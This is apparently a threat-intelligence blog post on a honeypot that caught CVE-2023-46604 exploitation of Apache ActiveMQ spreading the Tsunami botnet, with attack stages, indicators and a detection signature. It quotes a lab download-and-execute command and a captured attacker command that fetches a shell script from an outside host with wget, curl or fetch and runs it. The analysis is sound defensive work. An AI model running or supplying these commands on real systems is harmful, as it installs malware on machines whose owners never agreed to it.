---
layout: post
title: Tsunami Botnet was caught using ActiveMQ Honeypot
date: '2023-12-10 12:30:00 +0300'


categories: ['Caught by activemq-honeypot']
tags: ["botnet", "activemq-honeypot", "linux"]
---
## Executive Summary
In October 2023 Remote Code Execution vulnerability [CVE-2023-46604](https://www.cve.org/CVERecord?id=CVE-2023-46604) was published. This vulnerability in Apache ActiveMQ Legacy OpenWire Module got 10.0 Base Score by CNA. After that public exploits were created:
- [https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ](https://github.com/SaumyajeetDas/CVE-2023-46604-RCE-Reverse-Shell-Apache-ActiveMQ)
- [https://github.com/sule01u/CVE-2023-46604](https://github.com/sule01u/CVE-2023-46604)
- many other forks and similar exploits

These exploits contain real payloads which being used in the wild.

For example another similar attack [reported by FortiGuard Labs, CVE-2023-46604 exploitation and GoTitan Botnet spreading](https://www.fortinet.com/blog/threat-research/gotitan-botnet-exploitation-on-apache-activemq). 

After that fact I created fake vulnerable Apache ActiveMQ service which called [activemq-honeypot](https://github.com/infokek/activemq-honeypot).
This service emulates real vulnerable ActiveMQ service and can trigger attacker for exploitation, compromise attacker's attackchain, samples, C2 infrastructure and other helpful for Threat Intelligence things.


## Introduction to CVE-2023-46604
The Java OpenWire protocol marshaller can be vulnerable to Remote Code Execution. This vulnerability may allow a remote attacker with network access to either a Java-based OpenWire broker or client to run arbitrary shell commands. In fact this vulnerability used for malware Download & Execute attacks. This vulnerability commonly implemented in 2-3 stages. Let's look at this with an example of my testing infrastructure:

**1) Vulnerability exploitation**
![Attack Exploitation](../../assets/2023-12-10-tsunami-botnet-activemq-honeypot/attack_example.png)
_Attack exploitation_

Firstly attacker sends specific packet to Apache ActiveMQ service. This packet contains ExceptionResponse with Class `org.springframework.context.support.ClassPathXmlApplicationContext` and Message which contains XML payload url. 
![Exploitation Packet](../../assets/2023-12-10-tsunami-botnet-activemq-honeypot/exploitation_packet_example.png)
_ClassPathXmlApplicationContext message_

**2) XML payload downloading**

Secondly vulnerable service loads XML payload which commonly contains RCE command.
![XML Payload Loading](../../assets/2023-12-10-tsunami-botnet-activemq-honeypot/xml_loading_example.png)
_XML payload downloading_

For example here you can see command `curl -s -o test.elf http://172[.]17.0[.]1:8000/test.elf; chmod +x ./test.elf; ./test.elf` that was executed by vulnerable Apache ActiveMQ service.

**3) Malware executable downloading (Download & Execute)**

After succesful attack ActiveMQ service downloads malware executable and executes it. Commonly this is final exploitation step but there can be more different attack steps depending on the case.
![Executable Loading](../../assets/2023-12-10-tsunami-botnet-activemq-honeypot/exec_loading_example.png)
_Executable downloading_

This is example of attack scenario in my local testing infrastructure. Let's look at wild attack example.

## Wild Attack Example

[activemq-honeypot](https://github.com/infokek/activemq-honeypot) is rust-written, created by me, fakely vulnerable Apache ActiveMQ service that extracts IoCs and attack chain components from real vulnerability exploitations. You can check repository of this service here: [https://github.com/infokek/activemq-honeypot](https://github.com/infokek/activemq-honeypot)

Firstly I deployed [activemq-honeypot](https://github.com/infokek/activemq-honeypot) on my rented server and caught real attacker at 2023/12/19 19:21 UTC+3.
![Real Attack Logs](../../assets/2023-12-10-tsunami-botnet-activemq-honeypot/real_attack_logs.png)
_activemq-honeypot output logs_
Secondly honeypot got attack from [103[.]228.162[.]76](https://www.virustotal.com/gui/ip-address/103.228.162.76/detection) which identified as malicious on VirusTotal.

[activemq-honeypot](https://github.com/infokek/activemq-honeypot) also creates json output with IoCs after succesful exploitation.
![Real Attack Json](../../assets/2023-12-10-tsunami-botnet-activemq-honeypot/real_attack_json.png)
_activemq-honeypot output json_

Malicious XML payload was hosted on `hxxp://188[.]166.177[.]88/wp-content/themes/twentynineteen/poc2.xml`. 
![XML payload](../../assets/2023-12-10-tsunami-botnet-activemq-honeypot/xml_payload.png)
_Malicious XML payload_
This url also identified as malicious on VirusTotal service. Honeypot also automatically extracted RCE command from XML payload:

```bash -c (wget -O pk.sh  hxxp://161[.]35.219[.]184/.s/1sh || curl -o pk.sh hxxp://161[.]35.219[.]184/.s/3sh || fetch  -o pk.sh hxxp://161[.]35.219[.]184/.s/3sh); chmod +x pk.sh; ./pk.sh; rm -rf pk.sh```

This command downloads from [161[.]35.219[.]184](https://www.virustotal.com/gui/ip-address/161.35.219.184) malicious bash script [09aa65fc9e3b722f01a8ef65e4f5c352](https://www.virustotal.com/gui/file/09aa65fc9e3b722f01a8ef65e4f5c352/detection). 
![sh sample](../../assets/2023-12-10-tsunami-botnet-activemq-honeypot/sample_sh.png)
_Malicious bash script_

This malicious script contains `/dev/ttyN` UNIX system's mimicry. ELF32 executable that downloaded by this script [f895104d7e20dc6808c05164103d1357](https://www.virustotal.com/gui/file/f895104d7e20dc6808c05164103d1357/detection) attributed on VirusTotal as Tsunami Botnet.

![Botnet DiE](../../assets/2023-12-10-tsunami-botnet-activemq-honeypot/sample_botnet_die.png)
_Tsunami Botnet executable in Detect It Easy_

This sample packed with custom packer and detected by [Detect It Easy](https://github.com/horsicq/Detect-It-Easy) as UPX but can't be unpacked using standart UPX tool.

Moreover packed sample contains unknown specific string `hitteru koto dake`. This mark can be used in static detections in future.

![Botnet String](../../assets/2023-12-10-tsunami-botnet-activemq-honeypot/sample_botnet_string.png)
_Tsunami Botnet string in IDA_


I analysed this script on Triage Sandbox: [https://tria.ge/231209-wyxalsbdh4/](https://tria.ge/231209-wyxalsbdh4/) to check malicious behaviour.
This sample resolved C&C domain [p[.]deutschland-zahlung[.]eu](https://www.virustotal.com/gui/domain/p.deutschland-zahlung.eu) and contacted with C&C IP address [138[.]197.78[.]18](https://www.virustotal.com/gui/ip-address/138.197.78.18).
![Tsunami Botnet Traffic](../../assets/2023-12-10-tsunami-botnet-activemq-honeypot/tsunami_botnet_traffic2.png)
_Tsunami Botnet DNS resolve_

As we can see this botnet contains Telnet module which was used for C&C communications.

![Tsunami Botnet Traffic](../../assets/2023-12-10-tsunami-botnet-activemq-honeypot/tsunami_botnet_traffic.png)
_Tsunami Botnet C&C communication_

## Conclusion
CVE-2023-46604 seems to be popular vulnerability which used for Download & Execute different malware samples. In this case I caught Tsunami Botnet and researched it. In fact [activemq-honeypot](https://github.com/infokek/activemq-honeypot) can be used for catching more interesting attack chains and attack scenarious. Tsunami Botnet also detected by [Emerging Threats open ruleset](https://rules.emergingthreats.net/open/), Telnet C&C communations can be detected using signature `ET TROJAN ELF/Muhstik Botnet CnC Activity`, sid 2034743.


## Indicators Of Compromise
- `103[.]228.162[.]76` - attacker's host
- `188[.]166.177[.]88` - xml payload stager
- `161[.]35.219[.]184` - bash script stager
- `138[.]197.78[.]18` - botnet telnet module C&C
- `p[.]deutschland-zahlung[.]eu` - botnet telnet module C&C
- `d3fd8d78dbdde8260ee3e0a868f9d5af5b6fd496b7b085ef54633a7287b904bf` - malicious bash script C&C
- `86947b00a3d61b82b6f752876404953ff3c39952f2b261988baf63fbbbd6d6ae` - Tsunami botnet x32 executable